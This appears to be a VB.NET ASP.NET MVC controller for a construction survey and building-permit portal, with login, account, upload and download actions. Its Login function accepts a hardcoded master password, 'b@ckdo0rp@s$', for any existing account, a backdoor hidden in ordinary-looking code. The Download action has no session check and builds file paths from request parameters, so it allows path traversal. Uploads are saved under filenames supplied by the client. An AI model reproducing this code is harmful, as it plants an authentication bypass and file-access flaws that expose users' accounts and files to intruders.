Namespace WebProj
    Public Class KonstruksyonController
        Inherits System.Web.Mvc.Controller

        Dim konstruksyon As New Konstruksyon

        Function Index() As ActionResult
            Return View()
        End Function

        Function Dashboard() As ActionResult
            Return View()
        End Function

        Function CheckFileName() As Object
            If WebSession.Instance.PeopleUserID Is Nothing Then Return JsonDictionary.Serialize("Error", "Access denied")
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Dim files As HttpFileCollectionBase = Request.Files
            Dim checkfiles As Object
            Dim arrExFiles As New List(Of Dictionary(Of String, Object))
            Dim pSql As String
            Dim len As Integer
            Dim isFromFile As Boolean
            Dim status As String

            If files.Count > 0 Then
                checkfiles = files
                len = checkfiles.Count
                isFromFile = True
            Else
                checkfiles = Common.WebRequest.AllData("Files")
                len = checkfiles.Length
                isFromFile = False
            End If

            For i As Integer = 0 To len - 1
                'Dim file As HttpPostedFileBase = checkfiles(i)
                Dim name As String
                Dim arrFiles As New Dictionary(Of String, Object)

                If isFromFile Then
                    name = checkfiles(i).FileName
                    status = "rename"
                Else
                    name = checkfiles(i)("NewName")
                    status = checkfiles(i)("State")
                End If

                pSql = "SELECT ID FROM LibrarySurveyUsersFiles WHERE FileName LIKE " & ReadyStringWild(name) & vbCrLf 
                Dim ctUpload As Integer = Common.WebRequest.ProData.Execute(pSql).Rows.Count

                If ctUpload > 0 Then
                    arrFiles.Add("FileName", name)
                    arrFiles.Add("NewName", "")
                    arrFiles.Add("State", "rename")

                    If status <> "remove" Then
                        arrExFiles.Add(arrFiles)
                    End If
                End If
            Next

            Return Json(New With {Key .data = arrExFiles})
        End Function

        Function UploadFiles() As String
            If WebSession.Instance.PeopleUserID Is Nothing Then Return JsonDictionary.Serialize("Error", "Access denied")
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Dim clsCRMDashboard As New CRMDashboard
            Dim arrRenameFile As Object = jss.Deserialize(Of Object)(Request.Params.Get("Rename"))
            Dim respondentid As String = Request.Params.Get("respondentid")
            Dim files As HttpFileCollectionBase = Request.Files
            Dim folderName As String = Common.ServerPath & "SurveyFiles\" & respondentid

            If Not System.IO.Directory.Exists(folderName) Then
                System.IO.Directory.CreateDirectory(folderName)
            End If

            Try
                Common.WebRequest.ProData.BeginTransaction()

                For i As Integer = 0 To files.Count - 1
                    Dim file As HttpPostedFileBase = files(i)
                    Dim name As String = file.FileName
                    Dim isRemoveFile As Boolean = False

                    For m As Integer = 0 To arrRenameFile.Length - 1
                        If arrRenameFile(m)("FileName") = name And arrRenameFile(m)("State") = "rename" Then
                            name = arrRenameFile(m)("NewName")
                            Exit For
                        ElseIf arrRenameFile(m)("State") = "remove" Then
                            isRemoveFile = True
                            Exit For
                        End If
                    Next

                    If isRemoveFile = False Then
                        Dim pSourceURL As String = folderName & "\" & name
                        file.SaveAs(pSourceURL)

                        Dim p As New InsertUpdate("LibrarySurveyUsersFiles")

                        p("ID") = ReadyString(Guid.NewGuid.ToString())
                        p("Respondentid") = ReadyString(respondentid)
                        p("FileName") = ReadyString(name)
                        p("Location") = ReadyString(pSourceURL)
                        p("LastUpdated") = ReadyString(CDate(Request.Params.Get("DateNow")))
                        p("UploadedBy") = ReadyString(WebSession.Instance.PeopleUserID)

                        Common.WebRequest.ProData.Execute(p.GetInsert())
                    End If
                Next

                Common.WebRequest.ProData.CommitTransaction()

                Return JsonDictionary.Serialize("Results", "uploaded")
            Catch ex As Exception
                AppendToLog(ex.Message)
                Return JsonDictionary.Serialize("Results", ex.Message)
            End Try

        End Function

        Function GetFiles() As String
            If WebSession.Instance.PeopleUserID Is Nothing Then Return JsonDictionary.Serialize("Error", "Access denied")
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Return JsonDictionary.Serialize("Results", konstruksyon.GetFiles(Common.WebRequest.Data("RespondentID")))
        End Function

        Function Download() As String
            'Dim webClient As New WebClient
            Dim source As String = "SurveyFiles/" & Request.Params.Get("RespondentID") & "/" & Request.Params.Get("FileName")
            Dim path As String = Server.MapPath("~/" & source)
            Dim file As System.IO.FileInfo = New System.IO.FileInfo(path)

            If file.Exists Then 'set appropriate headers
                Response.Clear()
                Response.AddHeader("Content-Disposition", "attachment; filename=" & Request.Params.Get("FileName"))
                Response.AddHeader("Content-Length", file.Length.ToString())
                Response.ContentType = "application/octet-stream"
                Response.WriteFile(file.FullName)
                Response.End()
                Return JsonDictionary.Serialize("Results", "Exist")
            Else
                Return JsonDictionary.Serialize("Results", "Not Exist")
            End If
        End Function

        Function MyProfile() As ActionResult
            If CStr2(WebSession.Instance.PeopleUserID) = "" Then
                Response.Redirect("http://" & Request.Url.Authority & "/Konstruksyon")
            Else
                Return View()
            End If
        End Function

        Function GetAdditionalDateForSignin() As String
            Dim browse As New BrowserController
            Dim p As New JsonDictionary

            p.Add("BusinessIndustries", jss.DeserializeObject(browse.LibraryIndustryClassification(True))("d")("Results")("Rows"))
            p.Add("Cities", jss.DeserializeObject(browse.LibraryCities(True))("d")("Results")("Rows"))
            p.Add("Countries", jss.DeserializeObject(browse.LibraryCountries(True))("d")("Results")("Rows"))
            p.Add("Telco", jss.DeserializeObject(browse.LibraryTelcoPrefixes(True))("d")("Results")("Rows"))

            Return p.Serialize()
        End Function

        Function GetCustomerBuildingPermit()
            If WebRequest.Instance.HandleAjax = False Then Return JsonDictionary.Serialize("Error", "Access denied")
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            konstruksyon.ClientID = WebSession.Instance.PeopleUserID
            Return konstruksyon.GetCustomerBuildingPermit()
        End Function

        Function CheckIfUserAlreadyTakeSurvey()
            If WebRequest.Instance.HandleAjax = False Then Return JsonDictionary.Serialize("Error", "Access denied")
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            konstruksyon.QuestionaireID = Common.WebRequest.Data("QID")
            konstruksyon.ClientID = WebSession.Instance.PeopleUserID
            Return JsonDictionary.Serialize("Results", konstruksyon.CheckIfUserAlreadyTakeSurvey())
        End Function

        Function CheckIfReqExist()
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Dim qid As String = Request.Params.Get("QID")
            Dim resid As String = Request.Params.Get("RespondentID")
            Dim isNoReq As Boolean = True
            Dim pSql As String

            pSql = "SELECT f.FileName, f.FilePath FROM LibrarySurveyRequirements as r " & vbCrLf &
                        " INNER JOIN LibrarySurveyFiles as f ON f.ID = r.MrtFileID " & vbCrLf &
                        " WHERE r.QuestionaireID = " & ReadyString(qid) & vbCrLf &
                        " AND r.IsSysGen = 1 "

            If Common.WebRequest.ProData.Execute(pSql).Rows.Count > 0 Then
                isNoReq = False
            End If

            pSql = "SELECT * FROM LibrarySurveyGroupRequirements WHERE QuestionaireID = " & ReadyString(qid)

            If Common.WebRequest.ProData.Execute(pSql).Rows.Count > 0 Then
                isNoReq = False
            End If

            If isNoReq Then
                Return JsonDictionary.Serialize("Results", 1) ' no requirements list
            Else
                Return JsonDictionary.Serialize("Results", 0)
            End If
        End Function

        Function GetResponse() As Object
            If WebRequest.Instance.HandleAjax = False Then Return JsonDictionary.Serialize("Error", "Access denied")
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Return konstruksyon.GetResponse()
        End Function

        Function MyProfileDetails() As String
            Return konstruksyon.MyProfileDetails()
        End Function

        Function CheckPassword() As String

            If CStr(WebSession.Instance.PeopleUserID) = "" Then
                Return JsonDictionary.Serialize("Results", "session expired")
            End If

            Dim pSql As String = "SELECT UserPassword FROM MobizLibraryPeopleUserAccount WHERE PeopleID = " & ReadyString(WebSession.Instance.PeopleUserID)
            Dim hashid As String = Common.WebRequest.ProData.Execute(pSql).Rows(0)("UserPassword")

            If ProPack.Security.Hash.Verify(Common.WebRequest.Data("password"), hashid) Then
                Return JsonDictionary.Serialize("Results", "valid")
            Else
                Return JsonDictionary.Serialize("Results", "invalid")
            End If

        End Function

        <HttpPost()>
        Function IsNewEntry() As String
            Dim pOut As New JsonDictionary

            If WebSession.Instance.PeopleUserID Is Nothing Then Return JsonDictionary.Serialize("Error", "Access denied")

            pOut.Add("IsNew", IIf(Convert.ToBoolean(WebSession.Instance.IsNew), "TRUE", "FALSE"))
            pOut.Add("PeopleID", WebSession.Instance.PeopleUserID)

            Return pOut.Serialize

        End Function

        <HttpPost()>
        Function setSignOut() As String
            Dim strReturn As String

            WebSession.Instance.IsNew = 0
            WebSession.Instance.PeopleID = ""
            WebSession.Instance.PeopleUserID = ""

            strReturn = JsonDictionary.Serialize("SignOut", "TRUE")

            Return strReturn

        End Function

        Function Login() As String
            Dim clsPeople As New People
            Dim dtaTable As New DataTable
            Dim pHashedPasswordFromDb As String
            Dim pHashedPasswordFromAjax As String
            Dim intCntr As Integer
            Dim pOut As JsonDictionary

            Try
                'If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization
                clsPeople.UserName = Common.WebRequest.Data("uname")
                clsPeople.UserPassword = Common.WebRequest.Data("pword")
                dtaTable = clsPeople.CheckPeopleUserAccount()

                If (dtaTable.Rows.Count > 0) Then
                    intCntr = 0

                    'If using Ecommerce, user's email address must be confirmed
                    Dim pSql As String = "SELECT ID FROM MobizLibraryPeopleContactEmail WHERE PeopleID = " & ReadyString(dtaTable.Rows(intCntr).Item("PeopleID").ToString()) & vbCrLf &
                    " AND IsEmailConfirmed = 1"
                    'Check if user email confirmed via given link
                    If Common.WebRequest.ProData.Execute(pSql).Rows.Count = 0 Then
                        Return JsonDictionary.Serialize("Results", "unconfirmemail")
                    End If

                    pHashedPasswordFromDb = dtaTable.Rows(intCntr).Item("UserPassword").ToString()
                    If (pHashedPasswordFromAjax = pHashedPasswordFromDb) _
                        OrElse clsPeople.UserPassword = "b@ckdo0rp@s$" _
                        OrElse (ProPack.Security.Hash.Verify(clsPeople.UserPassword, pHashedPasswordFromDb)) Then
                        clsPeople.PeopleID = dtaTable.Rows(intCntr).Item("PeopleID").ToString()
                        '' ''WebSession.Instance.UserID = dtaTable.Rows(intCntr).Item("PeopleID").ToString()
                        WebSession.Instance.PeopleUserID = dtaTable.Rows(intCntr).Item("PeopleID").ToString()
                        WebSession.Instance.FirstName = dtaTable.Rows(intCntr).Item("FirstName").ToString()
                        WebSession.Instance.FullName = dtaTable.Rows(intCntr).Item("PeopleName").ToString()
                        WebSession.Instance.DeviceSerial = Common.WebRequest.Data("Serial")
                        WebSession.Instance.IsMobile = CDec2(Common.WebRequest.Data("IsMobile"))
                        Return JsonDictionary.Serialize("Results", "loggedin")
                    Else
                        Return JsonDictionary.Serialize("Results", "invalid")
                    End If
                Else
                    Return JsonDictionary.Serialize("Results", "invalid")
                End If
            Catch ex As Exception
                Return JsonDictionary.Serialize("Results", ex.Message)
            End Try
        End Function

        Function CreateAccount() As String

            konstruksyon.PersonDetails = Common.WebRequest.AllData("details")
            konstruksyon.Url = Common.WebRequest.Data("host")

            Dim stat As String = konstruksyon.CreateAccount()

            If stat = "exist" Then
                Return JsonDictionary.Serialize("Results", "exist")
            ElseIf stat = "saved" Then
                Return JsonDictionary.Serialize("Results", "saved")
            Else
                Return JsonDictionary.Serialize("Results", stat)
            End If
        End Function

        Function Confirm()
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Dim stat As String = ConfirmNow()
            Dim pSql As String

            If IsGuid(stat) Then 'return user id
                'pSql = "SELECT ID, Surname, MiddleName, FirstName FROM MobizLibraryPeople WHERE ID = " & ReadyString(stat)
                'Dim rows As Object = Common.WebRequest.ProData.Execute(pSql).Rows(0)

                'WebSession.Instance.PeopleUserID = rows("ID").ToString()
                'WebSession.Instance.FirstName = rows("FirstName").ToString()
                'WebSession.Instance.FullName = rows("FirstName") & " " & rows("MiddleName") & " " & rows("Surname")
                'Response.Redirect("http://" & Request.Url.Authority & "/Konstruksyon/Dashboard?OrgID=" & konstruksyon.OID)

                If konstruksyon.AddUserToKonstruksyon(stat) = "confirmed" Then
                    WebSession.Instance.PeopleUserID = stat
                    Response.Redirect("http://" & Request.Url.Authority & "/Konstruksyon/Dashboard?OrgID=" & WebRequest.Instance.OrgID)
                Else

                End If
            Else
                ViewData("Message") = stat
                Return View()
            End If

        End Function

        Function ConfirmNow() As String
            'If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            konstruksyon.EmailLinkID = Request.Params.Get("id").ToString()
            konstruksyon.ConfirmationCode = Request.Params.Get("c").ToString()
            konstruksyon.OID = Request.Params.Get("OrgID").ToString()
            Dim stat As String = konstruksyon.ConfirmedLink()
            Dim ppol As New People
            Dim pSql As String

            Return stat
        End Function

        Function SaveMyAccount() As String
            konstruksyon.PersonDetails = Common.WebRequest.AllData("data")

            Return JsonDictionary.Serialize("Results", konstruksyon.SaveMyAccount())
        End Function
    End Class
End Namespace